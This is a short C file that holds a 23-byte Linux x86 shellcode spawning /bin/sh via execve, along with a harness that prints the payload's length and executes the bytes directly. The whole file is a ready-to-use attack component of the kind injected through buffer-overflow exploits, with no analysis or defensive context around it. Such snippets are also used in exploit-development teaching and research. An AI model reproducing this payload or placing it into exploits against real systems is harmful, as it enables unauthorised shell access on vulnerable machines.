/* Linux x86 Shellcode
 * execve('/bin/sh')
 */
#include<stdio.h>
#include<string.h>

unsigned char payload[]=
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
"\x62\x69\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";

void main() {
	printf("Shellcode Length : %d\n", (int) strlen(payload));
	(*(void (*)()) payload)();
}